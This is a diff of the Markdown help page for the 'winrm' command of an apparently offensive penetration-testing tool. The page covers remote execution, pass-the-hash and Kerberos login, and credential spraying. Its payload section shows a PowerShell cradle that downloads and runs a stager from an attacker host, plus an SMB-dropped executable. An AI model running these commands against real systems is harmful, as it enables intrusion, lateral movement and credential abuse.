@@ -1,15 +1,132 @@
 # winrm
 
-Windows Remote Management (WinRM) operations.
+The `winrm` command provides Windows Remote Management (WinRM) operations for remote command execution and PowerShell remoting.
 
 ---
 
 ## Usage
 
 ```
-r4t winrm [flags]
+r4t winrm <subcommand> [flags]
 ```
 
-> **Status**: Base command registered. Subcommands are not yet implemented.
+---
 
-WinRM support is planned for authentication testing and remote command execution (PSRemoting). When implemented, it will use the global authentication flags against targets on ports 5985 (HTTP) and 5986 (HTTPS).
+## Overview
+
+WinRM is Microsoft's implementation of WS-Management, providing a SOAP-based protocol for remote system management. It enables operators to execute commands and PowerShell scripts on remote Windows hosts over HTTP (port 5985) or HTTPS (port 5986).
+
+WinRM is the protocol underlying PowerShell Remoting (`Enter-PSSession`, `Invoke-Command`) and is commonly enabled in enterprise environments for administrative management.
+
+---
+
+## Planned Capabilities
+
+| Capability | Description |
+|-----------|-------------|
+| **Command Execution** | Execute arbitrary commands on remote hosts |
+| **PowerShell Remoting** | Run PowerShell scripts and cmdlets remotely |
+| **Interactive Shell** | Establish an interactive remote shell session |
+| **File Transfer** | Upload and download files over WinRM |
+
+---
+
+## Authentication
+
+WinRM uses the same global authentication flags as all other R4t commands. The following authentication methods are supported:
+
+| Method | Flag | Description |
+|--------|------|-------------|
+| Password | `-u` / `-p` | Domain username and password |
+| NTLM Hash | `--hash` | Pass-the-hash via NT hash |
+| Kerberos | `--aes` / `--ccache` | Kerberos authentication via AES key or ccache |
+| Certificate (PFX) | `--pfx` | PFX certificate authentication |
+| Certificate (PEM) | `--cert` / `--key` | PEM certificate and key authentication |
+| Anonymous | `--anonymous` | Unauthenticated access |
+
+```bash
+# Execute a command on a remote host
+r4t winrm exec -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 "whoami /all"
+
+# Run a PowerShell command
+r4t winrm ps -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 "Get-Process | Select-Object -First 10"
+
+# Use NTLM hash authentication
+r4t winrm exec -u admin --hash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 10.10.10.20 "hostname"
+
+# Use Kerberos via ccache
+r4t winrm exec --ccache /tmp/krb5cc_admin -d corp.example.com 10.10.10.20 "ipconfig /all"
+
+# Use stored credentials
+r4t winrm exec --credential-id 1 10.10.10.20 "net user"
+```
+
+---
+
+## Connection Details
+
+| Property | Value |
+|----------|-------|
+| Protocol | WS-Management (SOAP over HTTP/HTTPS) |
+| HTTP Port | 5985 |
+| HTTPS Port | 5986 |
+| Authentication | NTLM, Kerberos, Basic, Certificate |
+| Libraries | `github.com/cloudbase/go-winrm`, `github.com/k8gege/LadonGo` |
+
+---
+
+## Payload Execution via WinRM
+
+WinRM is a primary execution channel for delivering payloads to remote hosts. The payload factory can generate artifacts suited for WinRM delivery:
+
+```bash
+# Execute a PowerShell stager
+r4t winrm ps -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 \
+  "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/stager.ps1')"
+
+# Execute encoded payload (fileless)
+r4t winrm ps -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 \
+  --encoded "<base64-payload>"
+
+# Execute a binary dropped via SMB
+r4t smb put -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 ./payload.exe C:\Windows\Temp\svc.exe
+r4t winrm exec -u admin -p 'P@ssw0rd' -d corp.example.com 10.10.10.20 "C:\Windows\Temp\svc.exe"
+```
+
+### Payload Factory Integration
+
+When the payload factory is operational, WinRM execution modules will request artifacts by capability:
+
+| Capability Request | Use Case |
+|-------------------|----------|
+| `execution=script`, `type=ps1` | PowerShell stager for in-memory execution |
+| `inmemory=true`, `execution=script` | Fileless execution via encoded PowerShell |
+| `execution=self-exec`, `os=windows` | Standard EXE executed after file transfer |
+| `reflective=true`, `execution=script` | Reflective DLL loaded via PowerShell cradle |
+
+---
+
+## Spray Integration
+
+WinRM credential spraying tests credentials against WinRM endpoints. See [`spray winrm`](./spray).
+
+```bash
+# Spray WinRM targets
+r4t spray winrm 10.10.10.20 10.10.10.21
+
+# Spray with stored users
+r4t spray winrm --db-users 10.10.10.20
+
+# Stop on lockout
+r4t spray winrm --stop-on-lockout 10.10.10.20
+```
+
+---
+
+## Related Commands
+
+- [`psremote`](./psremote) — PowerShell Remoting (full runspace execution over WinRM)
+- [`wmi`](./wmi) — WMI remote execution (alternative to WinRM)
+- [`smb`](./smb) — SMB file operations (payload staging)
+- [`spray`](./spray) — Multi-protocol credential spraying
+- [`rdp`](./rdp) — RDP operations
